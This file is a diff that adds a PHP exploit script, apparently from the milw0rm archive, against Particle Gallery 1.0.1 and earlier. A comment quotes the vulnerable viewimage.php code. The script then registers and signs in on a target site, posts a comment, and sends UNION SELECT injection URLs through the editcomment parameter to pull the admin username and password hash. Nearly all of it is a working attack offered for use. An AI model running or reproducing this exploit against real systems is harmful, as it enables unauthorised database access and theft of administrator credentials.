@@ -1,0 +1,317 @@
+#!/usr/bin/php -q -d short_open_tag=on
+<?php
+
+/*
+
+Explanation:
+
+Function dbSecure(functions.php):
+
+function dbSecure($code){
+	
+	if (get_magic_quotes_gpc()) {
+	   $code = stripslashes($code);
+	}
+	
+	if (function_exists("mysql_real_escape_string")){
+		$code = mysql_real_escape_string($code);
+	} elseif (function_exists("mysql_escape_string")){
+		$code = mysql_escape_string($code);
+	} else {
+		$code = addslashes($code);
+	}
+	
+	return $code;
+}
+
+
+Excellent function for SQL input validation, yet we don't even need this function here as we don't 
+need to add any quotes...haha!
+
+
+Vulnerable Code(viewimage.php):
+
+$t->set_var("COMMENT_ID", "");
+if ($_GET["editcomment"] <> ""){
+	$sql = "SELECT * FROM " . $dbprefix . "comments WHERE commentid = " . dbSecure($_GET["editcomment"]);
+	$cme = $db->execute($sql);
+	if ($usr->Access > 1 || ($_SESSION["userid"] == $cme->fields["userid"])){
+		// allow user to edit the comment
+		$t->set_var("COMMENTS_TYPE", "Edit");
+		$t->set_var("COMMENT_ID", $cme->fields["commentid"]);
+		$t->set_var("COMMENTS_FORM", $core . "&amp;commentspage=" . $page);
+		if ($_POST["comments"] <> ""){
+			$t->set_var("COMMENTS_TEXT", un($_POST["comments"]));
+		} else {
+			$t->set_var("COMMENTS_TEXT", $cme->fields["comments"]);
+		}
+	}
+
+
+...classic!
+
+*/
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+if ($argc<3) {
+print "-------------------------------------------------------------------------\r\n";
+print "              Particle Gallery <= 1.0.1 SQL Injection Exploit\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "Usage: w4ck1ng_pg.php [HOST] [PATH]\r\n\r\n";
+print "[HOST] 	  = Target server's hostname or ip address\r\n";
+print "[PATH] 	  = Path where Particle Gallery is located\r\n";
+print "e.g. w4ck1ng_pg.php 0 victim.com /pg/\r\n";
+print "-------------------------------------------------------------------------\r\n";
+print "            		 http://www.w4ck1ng.com\r\n";
+print "            		        ...Silentz\r\n";
+print "-------------------------------------------------------------------------\r\n";
+die;
+}
+
+function footer(){
+
+print "-------------------------------------------------------------------------\r\n";
+print "            		 http://www.w4ck1ng.com\r\n";
+print "            		        ...Silentz\r\n";
+print "-------------------------------------------------------------------------\r\n";
+
+}
+
+//Props to rgod for the following functions
+
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host = $argv[1];
+$path = $argv[2];
+$port=80;
+$proxy="";
+
+for ($i=4; $i<=$argc-1; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P"))
+{
+$cmd.=" ".$argv[$i];
+}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+
+print "-------------------------------------------------------------------------\r\n";
+print "              Particle Gallery <= 1.0.1 SQL Injection Exploit\r\n";
+print "-------------------------------------------------------------------------\r\n";
+
+    echo "\r\n[+] Checking if user exists...";
+
+    $data="username=w4ck1ng";
+    $data.="&password=w4ck1ng";
+    $data.="&from=";
+    $packet ="POST " . $p . "auth.php?do=signin HTTP/1.1\r\n";
+    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+    $packet.="Host: ".$host."\r\n";
+    $packet.="Content-Length: ".strlen($data)."\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    $packet.=$data;
+
+    sendpacketii($packet);
+
+    if (strstr($html,"User Control Panel")){echo "...Yep!\r\n";}
+    else{echo "...Nope!"; 
+ 
+    echo "\r\n[+] Registering...";
+
+    $data="rusername=w4ck1ng";
+    $data.="&password=w4ck1ng";
+    $data.="&password2=w4ck1ng";
+    $data.="&email=w4ck1ng%40www.com";
+    $data.="&do=register";
+    $packet ="POST " . $p . "auth.php?page=register HTTP/1.1\r\n";
+    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+    $packet.="Host: ".$host."\r\n";
+    $packet.="Content-Length: ".strlen($data)."\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    $packet.=$data;
+
+    sendpacketii($packet);
+
+    $temp=explode("Set-Cookie: ",$html);
+    $temp2=explode(" ",$temp[1]);
+    $cookie=$temp2[0];
+
+    if (strstr($html,"Location: index.php?act=newbie")){echo "...Successful!\r\n";}
+    if (strstr($html,"Registrations are not currently being accepted.")){echo "...Registration Disabled!\r\n"; footer(); exit;}
+    else{} }
+
+    echo "[+] Signing In...";
+
+    $data="username=w4ck1ng";
+    $data.="&password=w4ck1ng";
+    $data.="&from=";
+    $packet ="POST " . $p . "auth.php?do=signin HTTP/1.1\r\n";
+    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+    $packet.="Host: ".$host."\r\n";
+    $packet.="Content-Length: ".strlen($data)."\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    $packet.=$data;
+
+    sendpacketii($packet);
+
+    $temp=explode("Set-Cookie: ",$html);
+    $temp2=explode(" ",$temp[1]);
+    $cookie=$temp2[0];
+
+    if (strstr($html,"Welcome to your account control panel")){echo "...Successful!";}
+    else{die("...Failed!\r\n"); footer(); exit;} 
+
+    $packet ="GET " . $p . " HTTP/1.1\r\n";
+    $packet.="Host: " . $host . "\r\n";
+    $packet.="Cookie: " . $cookie . "\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    sendpacketii($packet);
+
+        if (strstr($html,"<td style=\"text-align: right;\"><a href=\"viewimage.php?imageid=")){
+
+	    	$temp=explode("<td style=\"text-align: right;\"><a href=\"viewimage.php?imageid=",$html);
+    		$temp2=explode("\">",$temp[1]);
+		$imageid=$temp2[0];
+
+		echo "\r\n[+] Image ID Retrieved..." . $imageid . "!\n";}
+
+	else{echo "\r\n[-] Cannot retrieve a valid image ID...\n"; footer(); exit;}
+
+
+    $data="comments=Your+about+to+get+owned%21";
+    $data.="&do=comment";
+    $data.="&commentid=";
+    $packet ="POST " . $p . "viewimage.php?imageid=" . $imageid . " HTTP/1.1\r\n";
+    $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
+    $packet.="Host: ".$host."\r\n";
+    $packet.="Content-Length: ".strlen($data)."\r\n";
+    $packet.="Cookie: " . $cookie . "\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    $packet.=$data;
+
+    sendpacketii($packet);
+
+    if (strstr($html,"Comments posted successfully!")){echo "[+] Posting comment...Done!\n";}
+    else{echo "[-] Posting comment...Failed!\n"; footer(); exit;} 
+
+    $sqlArray = array(
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,54),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*",
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,55),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*",
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,56),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*",
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,57),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*",
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,48),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*",
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,49),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*",
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,50),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*",
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,51),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*"
+);
+
+for ($i=0; $i<=count($sqlArray); $i++){
+
+    $packet ="GET " . $p . $sqlArray[$i] . " HTTP/1.1\r\n";
+    $packet.="Host: " . $host . "\r\n";
+    $packet.="Cookie: " . $cookie . "\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    sendpacketii($packet);
+
+    if (strstr($html,"name=\"comments\">Username=")){
+	    	$temp3=explode("id=\"comments\" name=\"comments\">Username=",$html);
+    		$temp4=explode(":",$temp3[1]);
+		$ret_user=$temp4[0];
+
+		echo "\r\n[+] Admin User: " . $ret_user;}
+
+    
+	elseif (strstr($html,"404")){
+			echo "\r\n[-] Image ID is not valid, please try another!"; footer(); exit;}
+    else{} 
+}
+
+    $sqlArray = array(
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,54),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*",
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,55),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*",
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,56),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*",
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(49,57),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*",
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,48),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*",
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,49),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*",
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,50),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*",
+"viewimage.php?imageid=$imageid&commentspage=1&editcomment=999/**/UNION/**/SELECT/**/0,0,CHAR(50,51),0,0,CONCAT(CHAR(85),CHAR(115),CHAR(101),CHAR(114),CHAR(110),CHAR(97),CHAR(109),CHAR(101),CHAR(61),username,CHAR(58),CHAR(72),CHAR(97),CHAR(115),CHAR(104),CHAR(61),password)/**/FROM/**/pg_users/**/where/**/userid=14/*"
+);
+
+for ($i=0; $i<=count($sqlArray); $i++){
+
+    $packet ="GET " . $p . $sqlArray[$i] . " HTTP/1.1\r\n";
+    $packet.="Host: " . $host . "\r\n";
+    $packet.="Cookie: " . $cookie . "\r\n";
+    $packet.="Connection: Close\r\n\r\n";
+    sendpacketii($packet);
+
+    if (strstr($html,":Hash=")){
+	    	$temp3=explode("Hash=",$html);
+    		$temp4=explode("</textarea>",$temp3[1]);
+		$ret_hash=$temp4[0];
+
+		echo "\r\n[+] Admin User: " . $ret_hash . "\n";}
+    else{} 
+}
+
+footer();
+
+?>
+
+# milw0rm.com [2007-06-01]
